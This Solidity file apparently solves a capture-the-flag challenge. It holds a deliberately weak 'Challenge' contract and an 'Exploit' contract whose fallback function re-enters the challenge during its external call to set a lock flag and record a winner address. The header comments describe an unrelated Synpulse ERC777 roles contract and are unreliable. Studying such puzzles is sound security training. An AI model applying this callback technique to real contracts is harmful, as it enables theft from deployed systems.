// SPDX-License-Identifier: MIT
// This contract was adapted from the ERC777 standard contract and deployed by : Janis M. Heibel, Roy Hove and Adil Anees on behalf of Synpulse.
// This following piece of code complements synpulseTokenGlobal contract. 
// It specifies the roles as well as the on / off function of the overall token contract.

pragma solidity ^0.8.0;

contract Challenge {

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}


contract Exploit {
    address challengeAddress = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    
    function attack() public {
        Challenge(challengeAddress).exploit_me(0xEcDA1249Af9498C7486f0b9D6774d75C02D7927a);
    }
    
    fallback() external {
        Challenge(challengeAddress).lock_me();
    }

}